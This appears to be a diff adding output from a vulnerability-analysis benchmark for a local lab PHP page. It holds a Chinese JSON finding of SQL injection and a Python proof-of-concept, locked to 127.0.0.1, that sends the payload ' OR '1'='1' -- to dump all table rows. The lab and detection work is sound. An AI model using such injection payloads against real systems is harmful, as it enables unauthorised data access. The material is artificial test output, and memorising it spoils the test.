@@ -1,0 +1,133 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": [
+    "F01:0007",
+    "F01:0010",
+    "F01:0011",
+    "F01:0012",
+    "F01:0021",
+    "F01:0023"
+  ],
+  "evidence": {
+    "source": "F01:0007 直接读取 GET 参数 name，未做类型、白名单或转义处理。",
+    "flow": "F01:0007 的 name 在 F01:0010 被拼接到 SQL 字符串，F01:0011 执行该 SQL，F01:0012 读取结果，F01:0021-F01:0023 展示记录。",
+    "guard": "无效：F01:0010 使用字符串拼接构造 SQL，未见参数绑定、白名单或 SQL 转义；F01:0022-F01:0023 的 htmlspecialchars 仅影响 HTML 输出编码，不影响 SQL 结构。",
+    "sink": "F01:0011 的 $db->query($sql) 执行由 F01:0010 拼接出的查询语句。"
+  },
+  "prerequisites": [
+    "PHP + MariaDB（MySQLi）本地服务运行，入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可访问。",
+    "common/db_connect.php 可加载，并提供已连接的 mysqli 变量 $db。",
+    "lab_people 表存在且预置记录为 1 Alice、2 Bob、3 Carol。",
+    "无需登录，GET 参数 name 可用于查询。"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现、数据库凭据和初始化脚本未在输入包中提供；仅依据运行上下文假定 $db 可用。",
+    "未提供服务器错误显示与字符集细节；POC 依赖当前 MySQL/MariaDB 的 -- 注释语法及 utf8mb4 环境。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "本脚本为本地验证方案，尚未执行。运行 python3 s001_poc.py；脚本固定目标为 http://127.0.0.1:4280/lab_cases/S001/index.php，并拒绝重定向。普通请求 name=Alice 预期解析出的业务记录集合为 {ID1 Alice}；测试请求 name=' OR '1'='1' -- （由脚本 URL 编码）预期解析出的业务记录集合为 {ID1 Alice, ID2 Bob, ID3 Carol}。成功条件是解析后的实际记录集合符合上述普通/测试差异，而不是仅看 HTTP 200 或字符串出现。失败时检查服务是否启动、common/db_connect.php 是否可加载、lab_people 是否按运行上下文预置、入口路径是否正确，以及 MariaDB 的 -- 注释语法是否生效。"
+}
+```
+
+```python
+import html
+import re
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+
+BASE_URL = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+EXPECTED_NORMAL = {("1", "Alice")}
+EXPECTED_TEST = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+TEST_PAYLOAD = "' OR '1'='1' -- "
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        raise urllib.error.HTTPError(
+            req.full_url, code, "重定向被拒绝，避免离开本地目标", headers, fp
+        )
+
+
+def validate_base_url():
+    parsed = urllib.parse.urlsplit(BASE_URL)
+    if parsed.scheme != "http":
+        raise ValueError("目标必须使用 http")
+    if parsed.hostname != "127.0.0.1":
+        raise ValueError("目标主机必须固定为 127.0.0.1")
+    if parsed.port != 4280:
+        raise ValueError("目标端口必须固定为 4280")
+    if parsed.path != "/lab_cases/S001/index.php":
+        raise ValueError("目标路径必须固定为 /lab_cases/S001/index.php")
+
+
+def build_url(name):
+    validate_base_url()
+    query = urllib.parse.urlencode({"name": name})
+    return BASE_URL + "?" + query
+
+
+def fetch(name):
+    url = build_url(name)
+    opener = urllib.request.build_opener(NoRedirect)
+    req = urllib.request.Request(url, headers={"User-Agent": "S001-local-poc"})
+    with opener.open(req, timeout=10) as resp:
+        body = resp.read().decode("utf-8", errors="replace")
+    return body
+
+
+def parse_records(body):
+    pattern = re.compile(r"<p>ID\s*(\d+)：([^<]*)</p>")
+    records = set()
+    for match in pattern.finditer(body):
+        records.add((match.group(1), html.unescape(match.group(2))))
+    return records
+
+
+def main():
+    try:
+        validate_base_url()
+        normal_body = fetch("Alice")
+        test_body = fetch(TEST_PAYLOAD)
+    except Exception as exc:
+        print("请求失败：", repr(exc))
+        print("请检查本地服务、入口路径、common/db_connect.php 和数据库初始化。")
+        return 2
+
+    normal_records = parse_records(normal_body)
+    test_records = parse_records(test_body)
+
+    print("普通请求解析记录：", sorted(normal_records))
+    print("测试请求解析记录：", sorted(test_records))
+    print("普通请求预期：", sorted(EXPECTED_NORMAL))
+    print("测试请求预期：", sorted(EXPECTED_TEST))
+
+    if normal_records != EXPECTED_NORMAL:
+        print("普通业务对照失败：实际记录与预置 Alice 记录不一致。")
+        print("请检查 lab_people 是否预置 1 Alice、2 Bob、3 Carol，或查询条件是否异常。")
+        return 1
+
+    if test_records != EXPECTED_TEST:
+        print("测试请求未达到预期记录集合。")
+        print("请检查 MariaDB 的 -- 注释语法、PHP 是否原样拼接 name、数据库字符集和表数据。")
+        return 1
+
+    if test_records == normal_records:
+        print("普通与测试记录无差异，无法证明 SQL 结构被改变。")
+        return 1
+
+    print("验证成功：测试输入改变了实际业务记录集合，普通请求仅返回 Alice，测试请求返回全部三条预置记录。")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+```json
+{
